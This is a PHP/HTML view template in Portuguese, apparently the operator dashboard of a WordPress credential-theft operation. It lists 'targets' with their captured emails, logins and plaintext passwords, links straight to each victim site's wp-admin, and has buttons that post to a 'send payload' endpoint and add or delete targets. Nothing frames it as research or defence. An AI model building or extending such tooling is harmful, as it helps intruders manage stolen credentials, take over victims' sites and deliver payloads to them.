<!DOCTYPE html>
<html>

<head>
    <title>Tabela com DataTables</title>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.25/css/jquery.dataTables.css">
</head>
<style>
    body {
        text-align: center;
        /* color:#FFF; */
        background-color: #d9d9d9;
    }

    input {
        width: 200px;
        height: 40px;
        padding: 5px;
    }
</style>

<body>

    <section style="margin-left:200px;margin-right:200px;margin-top:50px">




        <table id="tabelaAlvos" class="">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Email</th>
                    <th>Login</th>
                    <th>Password</th>
                    <th>Data</th>
                    <th></th>

                </tr>
            </thead>
            <tbody>
                <!-- Os dados da tabela seriam preenchidos dinamicamente a partir de uma fonte de dados, como um banco de dados -->

                <?php foreach ($this->main_model->countCredenciaisByUrl($alvo_url) as $c) { ?>
                    <tr>
                        <td><?= $c->id ?></td>
                        <td><?= $c->alvo_email ?></td>
                        <td><?= $c->alvo_login ?></td>
                        <td><?= $c->alvo_password ?></td>
                        <td><?= $c->alvo_data ?></td>

                        <td><a target="_blank" href="https://<?= $c->alvo_url ?>/wp-admin">ACESSAR PAINEL</a></td>

                    </tr>
                <?php } ?>


                <!-- Adicione mais linhas conforme necessário -->
            </tbody>
        </table>
    </section>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.datatables.net/1.10.25/js/jquery.dataTables.js"></script>
    <script>
        $(document).ready(function() {
            $('#tabelaAlvos').DataTable();
        });
    </script>
    <script>
        $('.enviar-payload').on('click', function(e) {

            var nome = $(this).attr('nome')
            var email = $(this).attr('email')
            var url = $(this).attr('url')
            var ref = $(this).attr('ref')

            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_send_payload',
                data: {
                    alvo_url: url,
                    alvo_email: email,
                    alvo_nome: nome,
                    alvo_ref: ref,
                },
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        alert('Enviado com sucesso!')
                        location.reload()

                    } else {
                        alert('Erro ao enviar')
                    }
                },
                error: function(data) {
                    alert('Ocorreu um erro temporário.');
                },
            });
        })

        $('.delete-alvo').on('click', function(e) {

            var id = $(this).attr('id')


            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_delete_alvo',
                data: {
                    alvo_id: id,

                },
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        alert('Excluido com sucesso!')
                        location.reload()

                    } else {
                        alert('Erro ao excluir')
                    }
                },
                error: function(data) {
                    alert('Ocorreu um erro temporário.');
                },
            });
        })

        $('#form-add-alvo').on('submit', function(e) {

            e.preventDefault()

            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_add_alvo',
                data: $(this).serialize(),
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        alert('Adicionado com sucesso!')
                        location.reload()

                    } else {
                        alert(resp.message)
                    }
                },
                error: function(data) {
                    alert('Ocorreu um erro temporário.');
                },
            });
        })
    </script>
</body>

</html>